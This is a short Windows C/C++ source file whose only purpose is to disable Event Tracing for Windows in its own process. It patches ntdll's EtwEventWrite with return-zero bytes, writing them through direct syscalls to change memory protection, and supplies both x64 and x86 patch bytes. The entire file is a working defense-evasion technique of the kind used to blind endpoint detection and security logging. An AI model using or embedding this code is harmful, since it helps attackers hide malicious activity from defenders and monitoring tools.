#include <windows.h>
#include <iostream>
#include "syscalls.h"

int DisableETW(void) {
	
	HANDLE curproc = GetCurrentProcess();
	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch, for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 }
	size_t size = sizeof(patch);

	LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");
  
  DWORD oldprotect1;
	LPVOID lpBaseAddress1 = lpFuncAddress1;
	ULONG NewProtection1;

	NtProtectVirtualMemory(curproc, &lpBaseAddress1, &size, PAGE_READWRITE, &oldprotect1);
	NtWriteVirtualMemory(curproc, lpFuncAddress1, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(curproc, &lpBaseAddress1, &size, oldprotect1, &NewProtection1);
  return 0;
}

int main(void) {
    
	printf("Before patching ETW functions\n"); getchar();
	DisableETW();
	printf("After patching ETW functions\n"); getchar();

	return 0;
}
